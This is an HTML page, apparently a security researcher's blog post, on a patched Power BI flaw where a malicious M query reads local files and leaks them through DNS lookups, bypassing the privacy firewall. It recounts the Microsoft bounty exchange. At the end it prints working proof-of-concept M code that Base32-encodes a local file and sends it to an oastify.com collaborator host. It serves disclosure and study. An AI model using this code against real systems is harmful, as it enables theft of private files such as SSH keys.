@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Querying a non-existent row: Full Local File Exfiltration in Power BI</title>
+  <style>
+    body {
+      background-color: #ffffcc;
+      color: black;
+      font-family: monospace;
+      margin: 40px;
+    }
+
+    a { color: blue; }
+    h2 { text-transform: lowercase; }
+    hr { border: 1px dashed #999; }
+
+    p {
+      margin-top: 0;
+      margin-bottom: 5px;
+    }
+
+    /* Spacing between sections */
+    h2 { margin-top: 2em; }
+
+    .blink {
+      animation: blink 1s step-start infinite;
+    }
+
+    @keyframes blink {
+      50% { opacity: 0; }
+    }
+
+    .wave-letter {
+      display: inline-block;
+      animation: wave 1.5s infinite ease-in-out;
+      font-weight: bold;
+      font-size: 32px;
+      background: linear-gradient(90deg, red, orange, yellow, green, cyan, blue, violet);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+      background-size: 800% 100%;
+    }
+
+    @keyframes wave {
+      0%   { transform: translateY(0); }
+      25%  { transform: translateY(-6px); }
+      50%  { transform: translateY(0); }
+      75%  { transform: translateY(6px); }
+      100% { transform: translateY(0); }
+    }
+
+    .wave-letter:nth-child(1)  { animation-delay: 0s; }
+    .wave-letter:nth-child(2)  { animation-delay: 0.1s; }
+    .wave-letter:nth-child(3)  { animation-delay: 0.2s; }
+    .wave-letter:nth-child(4)  { animation-delay: 0.3s; }
+    .wave-letter:nth-child(5)  { animation-delay: 0.4s; }
+    .wave-letter:nth-child(6)  { animation-delay: 0.5s; }
+    .wave-letter:nth-child(7)  { animation-delay: 0.6s; }
+    .wave-letter:nth-child(8)  { animation-delay: 0.7s; }
+    .wave-letter:nth-child(9)  { animation-delay: 0.8s; }
+    .wave-letter:nth-child(10) { animation-delay: 0.9s; }
+    .wave-letter:nth-child(11) { animation-delay: 1.0s; }
+    .wave-letter:nth-child(12) { animation-delay: 1.1s; }
+
+    pre.code-green {
+      background: #000;
+      color: #0f0;
+      padding: 1em;
+      overflow-x: auto;
+      font-family: "Source Code Pro", monospace;
+      border-radius: 4px;
+      margin: 1.5em 0;
+    }
+    pre.code-green code {
+      color: inherit;
+      background: none;
+    }
+  </style>
+</head>
+
+<body class="site">
+  <header class="site-header">
+    <div class="inner">
+      <nav class="site-nav">
+        <a href="https://blog.qwertysecurity.com/">Home</a>
+        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="site-main inner">
+    <article class="post">
+      <header class="post-header">
+        <h1 class="post-title">
+         Querying a non-existent row: Full Local File Exfiltration in Power BI
+        </h1>
+        <p class="post-meta"><b>December 22, 2025 - Vulnerability Write-up</b></p>
+      </header>
+
+      <div class="post-content">
+        <p>Sometimes the best bugs come from a rejection. This is the story of how I turned a dismissed "SMB Credential Leak" into an important "Local File Exfiltration" vulnerability.</p>
+        <p>Up until the November 2025 patch, a simple malicious PowerBi file could silently read your local files and tunnel them out via DNS, completely bypassing the "Privacy Level" firewall.</p>
+        <p>This went from "Not a Vulnerability" to a $30,000 bounty because I refused to accept that an unauthorized outbound connection had no real security impact.</p>
+
+        <hr>
+
+        <h2>The Catalyst: A Failed Report</h2>
+        <p>It started when I found I could force Power BI to connect back to my malicious SMB server. I reported it as a standard "forced authentication" credential leak (NTLM hash theft).</p>
+        <p>Microsoft refused it. They argued that forcing a connection wasn't enough of a security boundary violation in this context and that modern systems had protection against these kind of credential leaks.</p>
+        <p>That rejection annoyed me. I thought: <i>"Okay, if you don't care about the connection itself, surely I can do more with that."</i></p>
+        <p>That pivot led me to look at what was around the bug itself. And that's how I realize that it was a great exfiltration opportunity.</p>
+
+        <h2>What Was at Risk?</h2>
+        <p>On an unpatched component using M Query a malicious query could:</p>
+        <ul>
+          <li>Read any file on the host filesystem (e.g., <code>C:\Users\admin\.ssh\id_rsa</code>)</li>
+          <li>Encode that file content into a subdomain string</li>
+          <li>Trigger a DNS lookup to an attacker-controlled nameserver</li>
+          <li><b>Bypass the Privacy Firewall entirely</b> (no "Information is required about data privacy" prompt)</li>
+        </ul>
+
+        <h2>How the PoC Worked</h2>
+        <p>The exploit relies on a bug that would let you verify the existence on a file in a folder open with Folder.Files with full path via Table.SelectRows, which let you poke external servers.</p>
+        <ol>
+          <li><b>Read:</b> The script reads a sensitive local file (e.g., <code>C:\tmp\secret.txt</code>).</li>
+          <li><b>Encode:</b> I convert the binary content to custom Base32 encoding. (Required because standard DNS is case-insensitive, which corrupts Base64).</li>
+          <li><b>Construct:</b> I create a dynamic string: <code>\\&lt;ENCODED_SECRET&gt;.attacker.tld\share\fake.txt</code>.</li>
+          <li><b>Trigger:</b> I use <code>Table.SelectRows</code> to filter the folder. Power BI thinks, "I need to check if this file exists to run the filter."</li>
+        </ol>
+        <p>The OS sends a DNS A-Record query for <code>SECRET.attacker.com</code>. In my case, the collaborator logs the query.</p>
+
+        <h2>On Bug Bounty</h2>
+        <p>Even after pivoting to full file exfiltration, it wasn't a straight shot.</p>
+        <p><b>Aug 20:</b> I submitted the new report demonstrating file exfiltration.</p>
+        <p><b>Sept 08:</b> MSRC rejected it <i>again</i>. <i>"This vulnerability hinges on WebDAV authentication... PowerBI wouldn't be able to probe it."</i></p>
+        <p>It seems to have been simple miscommunication.</p>
+        <p><b>Sept 08 (Same day):</b> I pushed back immediately. I explained that they were looking at it wrong.</p>
+        <p><b>Sept 09:</b> Case Reopened. Severity upgraded to <b>Important</b>.</p>
+        <p><b>Sept 23:</b> Awarded <b>$30,000</b>.</p>
+
+        <h2>Wrapping Up</h2>
+        <p><b>Rejection is just a challenge.</b> Don't be afraid to try harder and escalate.</p>
+        <p>Microsoft patched this in the <b>November 2025 Security Update</b>.</p>
+        <p>The engine now evaluates the privacy scope of a path <i>before</i> attempting to resolve it.</p>
+
+        <h2>Proof.mp4</h2>
+        <details>
+            <summary style="cursor: pointer; font-weight: bold; color: blue; text-decoration: underline;">
+              Click me for proof
+            </summary>
+            <p id="videopoc">
+            <br>
+              <video style="width: 75%; height: auto;" muted="" autoplay="" controls="">
+                <source src="/Proofs/blog6/poc.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+              </video>
+            </p>
+        </details>
+
+        <h2>POC</h2>
+        <p>
+        The exploit code abuses the M Query order of operations. Note the custom Base32 implementation to handle DNS case-insensitivity.
+        </p>
+<pre class="code-green"><code>let Base32Encode = (binary as binary) as text =>
+        let
+            alphabet = Text.ToList("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"),
+            bytes = Binary.ToList(binary),
+            byteBits = List.Transform(bytes, (b) =>
+                List.Transform({0..7}, (i) =>
+                    Number.Mod(Number.IntegerDivide(b, Number.Power(2, 7 - i)), 2)
+                )
+            ),
+            bits = List.Combine(byteBits),
+            padBits = Number.Mod(5 - Number.Mod(List.Count(bits), 5), 5),
+            paddedBits = List.Combine({bits, List.Repeat({0}, padBits)}),
+            groups = List.Split(paddedBits, 5),
+            values = List.Transform(groups, (g) =>
+                List.Sum(List.Transform({0..4}, (i) => g{i} * Number.Power(2, 4 - i)))
+            ),
+            encoded = List.Transform(values, each alphabet{_}),
+            result = Text.Combine(encoded)
+        in
+            result,
+
+    Source = Folder.Files("C:\\tmp"),
+    content = Base32Encode(Source{0}[Content]),
+    Filtered = try
+        Table.SelectRows(Source, each [Name] = "//" & content & ".4tyvfxctg0ftownaumy3fr5ix930r5fu.oastify.com/zw/")
+    otherwise
+        #table({}, {}),
+    Content = Table.TransformColumns(Filtered, {"Content", each Text.Split(Text.FromBinary(_, TextEncoding.Utf8), "#(lf)")}),
+    FirstFile = if Table.RowCount(Content) > 0 then Content{0}[Content] else {},
+    AsTable = Table.FromList(FirstFile, Splitter.SplitByNothing(), {"Line"})
+in
+    AsTable
+
+</code></pre>
+      </div>
+    </article>
+  </main>
+  <br>
+  <footer class="site-footer">
+    <div class="inner">
+      <nav class="site-nav">
+        <a href="https://blog.qwertysecurity.com/">Home</a>
+        <a href="https://www.linkedin.com/in/felix-boulet/">LinkedIn</a>
+      </nav>
+    </div>
+  </footer>
+</body>
+</html>
